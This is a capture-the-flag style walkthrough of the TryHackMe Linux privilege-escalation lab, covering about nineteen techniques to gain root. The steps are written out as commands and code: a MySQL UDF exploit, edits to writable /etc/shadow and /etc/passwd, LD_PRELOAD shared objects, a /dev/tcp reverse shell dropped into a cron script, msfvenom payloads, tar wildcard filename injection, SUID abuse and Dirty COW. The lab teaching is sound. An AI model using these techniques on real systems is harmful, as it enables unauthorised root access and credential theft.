# 7 - Linux PrivEsc

Room Link --> [https://tryhackme.com/room/linuxprivesc](https://tryhackme.com/room/linuxprivesc)

The password for the "user" account is "password321".

SSH Login --> `ssh -oHostKeyAlgorithms=+ssh-dss user@10.10.175.212`&#x20;

### 1 - Service Exploits

The MySQL service is running as root and the "root" user for the service does not have a password assigned. We can use a [popular exploit](https://www.exploit-db.com/exploits/1518) that takes advantage of User Defined Functions (UDFs) to run system commands as root via the MySQL service.

Change into the /home/user/tools/mysql-udf directory:  `cd /home/user/tools/mysql-udf`

Compile the raptor\_udf2.c exploit code using the following commands:

`gcc -g -c raptor_udf2.c -fPIC`\
`gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc`

Execute the following commands on the MySQL shell to create a User Defined Function (UDF) "do\_system" using our compiled exploit:

`use mysql;`\
`create table foo(line blob);`\
`insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));`\
`select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';`\
`create function do_system returns integer soname 'raptor_udf2.so';`

Use the function to copy /bin/bash to /tmp/rootbash and set the SUID permission:

`select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');`

Exit out of the MySQL shell (type exit or \q and press Enter) and run the /tmp/rootbash executable with -p to gain a shell running with root privileges:

`/tmp/rootbash -p`

Remember to remove the /tmp/rootbash executable and exit out of the root shell before continuing as you will create this file again later in the room!

`rm /tmp/rootbash`\
`exit`

### 2 - Weak File Permissions - Readable /etc/shadow

Note that the /etc/shadow file on the VM is world-readable:

`ls -l /etc/shadow`

View the contents of the /etc/shadow file:

`cat /etc/shadow`

Use `unshadow password_file.txt shadow_file.txt` - to create a crackable format for john to crack.

### 3 - Weak File Permissions - Writable /etc/shadow

Note that the /etc/shadow file on the VM is world-writable:

`ls -l /etc/shadow`

Since we can write to it, and also identify the hashing algorithm type as "sha512crypt" we can easily create a password in "sha512" hash format and write it to the shadow file for the "user" user.

`mkpasswd -m sha-512 newpassword` - create a password in hash format (sha512).

Then Edit the /etc/shadow file and replace the original root user's password hash with the newly created hash.

### 4 - Weak File Permissions - Writable /etc/passwd

The /etc/passwd file contains information about user accounts. It is world-readable, but usually only writable by the root user. Historically, the /etc/passwd file contained user password hashes, and some versions of Linux will still allow password hashes to be stored there.

Note that the /etc/passwd file is world-writable:

`ls -l /etc/passwd`

Generate a new password hash with a password of your choice:

`openssl passwd newpasswordhere`

Edit the /etc/passwd file and place the generated password hash between the first and second colon (:) of the root user's row (replacing the "x").

Switch to the root user, using the new password:

`su root`

Alternatively, copy the root user's row and append it to the bottom of the file, changing the first instance of the word "root" to "newroot" and placing the generated password hash between the first and second colon (replacing the "x").\


Now switch to the newroot user, using the new password:

`su newroot`

### 5 - Sudo - Shell Escape Sequences

List the programs which sudo allows our user to run:

`sudo -l`

Visit GTFOBins ([https://gtfobins.github.io](https://gtfobins.github.io/)) and search for some of the program names. If the program is listed with "sudo" as a function, you can use it to elevate privileges, usually via an escape sequence.

### 6 - Sudo - Environment Variables

Sudo can be configured to inherit certain environment variables from the user's environment.

Check which environment variables are inherited (look for the env\_keep options):

`sudo -l`

<figure><img src=".gitbook/assets/image (50).png" alt=""><figcaption><p>1</p></figcaption></figure>

LD\_PRELOAD and LD\_LIBRARY\_PATH are both inherited from the user's environment. <mark style="color:green;">**LD\_PRELOAD**</mark> loads a shared object before any others when a program is run. <mark style="color:red;">**LD\_LIBRARY\_PATH**</mark> provides a list of directories where shared libraries are searched for first.

#### Shared Object (LD\_PRELOAD)

Create a shared object using the code located at "/home/user/tools/sudo/preload.c":

<figure><img src=".gitbook/assets/image (51).png" alt=""><figcaption><p>2</p></figcaption></figure>

`gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c`

Run one of the programs you are allowed to run via sudo (listed when running sudo -l), while setting the LD\_PRELOAD environment variable to the full path of the new shared object:

`sudo LD_PRELOAD=/tmp/preload.so /usr/bin/nmap` -&#x20;

<figure><img src=".gitbook/assets/image (52).png" alt=""><figcaption><p>3</p></figcaption></figure>

And we get root!

#### Shared Libraries (LD\_LIBRARY\_PATH)

Run `ldd` against the apache2 program file to see which shared libraries are used by the program:

`ldd /usr/sbin/apache2`

<figure><img src=".gitbook/assets/image (53).png" alt=""><figcaption><p>4</p></figcaption></figure>

Create a shared object with the same name as one of the listed libraries (libcrypt.so.1) using the code located at /home/user/tools/sudo/library\_path.c:

<figure><img src=".gitbook/assets/image (54).png" alt=""><figcaption><p>5</p></figcaption></figure>

`gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c`

Run apache2 using sudo, while settings the LD\_LIBRARY\_PATH environment variable to /tmp (where we output the compiled shared object):

`sudo LD_LIBRARY_PATH=/tmp apache2`

<figure><img src=".gitbook/assets/image (55).png" alt=""><figcaption><p>6</p></figcaption></figure>

### 7 - Cron Jobs - File Permissions

Cron jobs are programs or scripts which users can schedule to run at specific times or intervals. Cron table files (crontabs) store the configuration for cron jobs. The system-wide crontab is located at /etc/crontab.

View the contents of the system-wide crontab:

`cat /etc/crontab`

There should be two cron jobs scheduled to run every minute. One runs overwrite.sh, the other runs /usr/local/bin/compress.sh.

Locate the full path of the overwrite.sh file:

`locate overwrite.sh`

Note that the file is world-writable:

`ls -l /usr/local/bin/overwrite.sh`

Since it's writable, we can replace its content with a malicious code. In this case "a rev shell"&#x20;

```bash
#!/bin/bash
bash -i >& /dev/tcp/10.18.88.214/4444 0>&1

# listener
nc -nvlp 4444

# we should get root after 1 minute.
```

<figure><img src=".gitbook/assets/image (56).png" alt=""><figcaption><p>1</p></figcaption></figure>

### 8 - Cron Jobs - PATH Environment Variable

View the contents of the system-wide crontab:

`cat /etc/crontab`

Note that the PATH variable starts with /home/user which is our user's home directory.

Create a file called overwrite.sh in your home directory with the following contents:

```bash
#!/bin/bash

cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
```

Make sure that the file is executable:

`chmod +x /home/user/overwrite.sh`

Wait for the cron job to run (should not take longer than a minute). Run the `/tmp/rootbash`  command with -p to gain a shell running with root privileges:

`/tmp/rootbash -p`

### 9 - Cron Jobs - WildCards

View the contents of the other cron job script:

`cat /usr/local/bin/compress.sh`

Note that the tar command is being run with a wildcard (\*) in your home directory.

Take a look at the GTFOBins page for [tar](https://gtfobins.github.io/gtfobins/tar/). Note that tar has command line options that let you run other commands as part of a checkpoint feature.

Use msfvenom on your Kali box to generate a reverse shell ELF binary. Update the LHOST IP address accordingly:

`msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf`

Transfer the shell.elf file to /home/user/ on the Debian VM (you can use scp or host the file on a webserver on your Kali box and use wget). Make sure the file is executable:

`chmod +x /home/user/shell.elf`

Create these two files in /home/user:

`touch /home/user/--checkpoint=1`\
`touch /home/user/--checkpoint-action=exec=shell.elf`

When the tar command in the cron job runs, the wildcard (\*) will expand to include these files. Since their filenames are valid tar command line options, tar will recognize them as such and treat them as command line options rather than filenames.

Set up a netcat listener on your Kali box on port 4444 and wait for the cron job to run (should not take longer than a minute). A root shell should connect back to your netcat listener.

`nc -nvlp 4444`

We get root after 1minute.

### 10 - SUID / SGID Executables - Known Exploits

Find all the SUID/SGID executables on the Debian VM:

`find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`

Note that `/usr/sbin/exim-4.84-3` appears in the results. Try to find a known exploit for this version of exim. [Exploit-DB](https://www.exploit-db.com/), Google, and GitHub are good places to search!

A local privilege escalation exploit matching this version of exim exactly should be available. A copy can be found on the Debian VM at /home/user/tools/suid/exim/cve-2016-1531.sh.

Run the exploit script to gain a root shell:

`/home/user/tools/suid/exim/cve-2016-1531.sh`

### 11 - SUID / SGID Executables - Shared Object Injection

#### Using LinPEAS to identify Shared Object Injections

After running LinPEAS. we analyze the results closely, we found that it checks the binaries with _strace_ utility to identify the shared objects and libraries utilized by the binaries.\


<figure><img src=".gitbook/assets/image (57).png" alt=""><figcaption><p>1</p></figcaption></figure>

As highlighted above, we can identify _**suid-so**_ binary that utilize many shared objects that do not exist on the target system. One interesting file there is the _libcalc.so_ which exists at the user’s home directory. Since we are logged on as the user, we should be able to modify this shared object in hopes of executing arbitrary commands. This should give us an elevated session when _suid-so_ is executed.

**NB**: Linux Shared Objects is equivalent to Windows Dynamic Link Library (**DLL**) and this attack is similar to [Windows DLL Hijacking](https://medium.com/@tinopreter/windows-privilege-escalation-2-hijacking-dlls-28505b68a978) technique where we replaced a the target DLL with a modified one that returns us an elevated session upon execution.

Alternatively, we can manually search for the shared objects of a specific binary with command:

{% code overflow="wrap" lineNumbers="true" %}
```bash
strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
```
{% endcode %}

<figure><img src="https://miro.medium.com/v2/resize:fit:578/1*cLVNWFrhGXRYlkxdcT3pIA.png" alt="" height="234" width="700"><figcaption><p>2</p></figcaption></figure>

We can also utilize _strings_ to display a list of useful strings found in the binary.

```bash
strings /usr/local/bin/suid-so
```

<figure><img src="https://miro.medium.com/v2/resize:fit:370/1*xGC-Zj0gbtWIrRHJDtoPgA.png" alt="" height="241" width="449"><figcaption><p>3</p></figcaption></figure>

Running _suid-so_ showed nothing but an information that says it’s performing a calculation and then a progress bar.

<figure><img src="https://miro.medium.com/v2/resize:fit:578/1*awnZHDo6nULQSxEEA0lb5A.png" alt="" height="101" width="700"><figcaption><p>4</p></figcaption></figure>

Cross checking the _libcalc.so_ directory on the user’s home directory showed that, the _.config_ directory doesn’t even exist.

<figure><img src="https://miro.medium.com/v2/resize:fit:540/1*ZIq1bCfPZ03FcCLpT_TWCg.png" alt="" height="64" width="655"><figcaption><p>5</p></figcaption></figure>

We will take advantage of this to create the .config directory with command:

```
mkdir /home/user/.config
```

There's alreadt a "libcalc.c" provided by the lab at "/home/user/tools/suid/libcalc.c". It simply spawns a Bash shell. Compile the code into a shared object at the location the suid-so executable was looking for it:

{% code overflow="wrap" lineNumbers="true" %}
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
	setuid(0);
	system("/bin/bash -p");
}
```
{% endcode %}

<figure><img src=".gitbook/assets/image (58).png" alt=""><figcaption><p>6</p></figcaption></figure>

We compile it:

`gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c`

Execute it: `/usr/local/bin/suid-so` \


<figure><img src=".gitbook/assets/image (59).png" alt=""><figcaption><p>7</p></figcaption></figure>

### 12 - SUID / SGID Executables - Environment Variables

The `/usr/local/bin/suid-env` executable can be exploited due to it inheriting the user's PATH environment variable and attempting to execute programs without specifying an absolute path.

First, execute the file and note that it seems to be trying to start the apache2 webserver:

`/usr/local/bin/suid-env`

Run strings on the file to look for strings of printable characters:

`strings /usr/local/bin/suid-env`

One line ("service apache2 start") suggests that the service executable is being called to start the webserver, however the full path of the executable (/usr/sbin/service) is not being used.

Compile the code located at /home/user/tools/suid/service.c into an executable called service. This code simply spawns a Bash shell:

```c
int main() {
	setuid(0);
	system("/bin/bash -p");
}
```

<figure><img src=".gitbook/assets/image (60).png" alt=""><figcaption><p>1</p></figcaption></figure>

`gcc -o service /home/user/tools/suid/service.c`

Prepend the current directory (or where the new service executable is located) to the PATH variable, and run the suid-env executable to gain a root shell:

`PATH=.:$PATH` -  meaning add our current pwd `.` to the begining of the environment PATH variables.

<figure><img src=".gitbook/assets/image (61).png" alt=""><figcaption><p>2</p></figcaption></figure>

We get root shell.

### 13 - SUID / SGID Executables - Abusing Shell Features (#1)

The `/usr/local/bin/suid-env2` executable is identical to `/usr/local/bin/suid-env` except that it uses the absolute path of the service executable (/usr/sbin/service) to start the apache2 webserver.

Verify this with strings:

`strings /usr/local/bin/suid-env2`\


<figure><img src=".gitbook/assets/image (62).png" alt=""><figcaption><p>1</p></figcaption></figure>

In Bash versions <4.2-048 it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any actual executable at that file path.

Verify the version of Bash installed on the Debian VM is less than 4.2-048:

`/bin/bash --version`

<figure><img src=".gitbook/assets/image (63).png" alt=""><figcaption><p>2</p></figcaption></figure>

Create a Bash function with the name "/usr/sbin/service" that executes a new Bash shell (using -p so permissions are preserved) and export the function:

`function /usr/sbin/service { /bin/bash -p; }`\
`export -f /usr/sbin/service`

Run the suid-env2 executable to gain a root shell:

`/usr/local/bin/suid-env2`

<figure><img src=".gitbook/assets/image (64).png" alt=""><figcaption><p>3</p></figcaption></figure>

### 14 - SUID / SGID Executables - Abusing Shell Features (#2)

Note: This will not work on Bash versions 4.4 and above.

When in debugging mode, Bash uses the environment variable PS4 to display an extra prompt for debugging statements.\


Run the /usr/local/bin/suid-env2 executable with bash debugging enabled and the PS4 variable set to an embedded command which creates an SUID version of /bin/bash:

`env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2`

Run the /tmp/rootbash executable with -p to gain a shell running with root privileges:

`/tmp/rootbash -p`

<figure><img src=".gitbook/assets/image (65).png" alt=""><figcaption><p>1</p></figcaption></figure>

### 15 - Passwords & Keys - History Files

If a user accidentally types their password on the command line instead of into a password prompt, it may get recorded in a history file.

View the contents of all the hidden history files in the user's home directory:

`cat ~/.*history | less`

Note that the user has tried to connect to a MySQL server at some point, using the "root" username and a password submitted via the command line. Note that there is no space between the -p option and the password!

Switch to the root user, using the password:

`su root`

### 16 - Passwords & Keys - Config Files

Config files often contain passwords in plaintext or other reversible formats.

List the contents of the user's home directory:

`ls /home/user`

Note the presence of a myvpn.ovpn config file. View the contents of the file:

`cat /home/user/myvpn.ovpn`

The file should contain a reference to another location where the root user's credentials can be found. Switch to the root user, using the credentials:

`su root`

### 17 - Passwords & Keys - SSH Keys

Sometimes users make backups of important files but fail to secure them with the correct permissions.

Look for hidden files & directories in the system root:

`ls -la /`

Note that there appears to be a hidden directory called .ssh. View the contents of the directory:

`ls -l /.ssh`

Note that there is a world-readable file called root\_key. Further inspection of this file should indicate it is a private SSH key. The name of the file suggests it is for the root user.

Copy the key over to your Kali box (it's easier to just view the contents of the root\_key file and copy/paste the key) and give it the correct permissions, otherwise your SSH client will refuse to use it:

`chmod 600 root_key`

Use the key to login to the Debian VM as the root account (note that due to the age of the box, some additional settings are required when using SSH):

`ssh -i root_key -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa root@10.10.71.158`

<figure><img src=".gitbook/assets/image (66).png" alt=""><figcaption><p>1</p></figcaption></figure>

### 18 - NFS

Files created via NFS inherit the remote user's ID. If the user is root, and root squashing is enabled, the ID will instead be set to the "nobody" user.

Check the NFS share configuration on the Debian VM:

`cat /etc/exports`

Note that the /tmp share has root squashing disabled.

On your Kali box, switch to your root user if you are not already running as root:

`sudo su`

Using Kali's root user, create a mount point on your Kali box and mount the /tmp share (update the IP accordingly):

`mkdir /tmp/nfs`\
`mount -o rw,vers=3 10.10.10.10:/tmp /tmp/nfs`

Still using Kali's root user, generate a payload using msfvenom and save it to the mounted share (this payload simply calls /bin/bash):

`msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf`

Still using Kali's root user, make the file executable and set the SUID permission:

`chmod +xs /tmp/nfs/shell.elf`

Back on the Debian VM, as the low privileged user account, execute the file to gain a root shell:

`/tmp/shell.elf`

### 19 - Kernel Exploits

Kernel exploits can leave the system in an unstable state, which is why you should only run them as a last resort.

Run the Linux Exploit Suggester 2 tool to identify potential kernel exploits on the current system:

`perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl`

The popular Linux kernel exploit "Dirty COW" should be listed. Exploit code for Dirty COW can be found at /home/user/tools/kernel-exploits/dirtycow/c0w.c. It replaces the SUID file /usr/bin/passwd with one that spawns a shell (a backup of /usr/bin/passwd is made at /tmp/bak).

Compile the code and run it (note that it may take several minutes to complete):

`gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w`\
`./c0w`

Once the exploit completes, run /usr/bin/passwd to gain a root shell:

`/usr/bin/passwd`

Remember to restore the original /usr/bin/passwd file and exit the root shell before continuing!

`mv /tmp/bak /usr/bin/passwd`\
`exit`

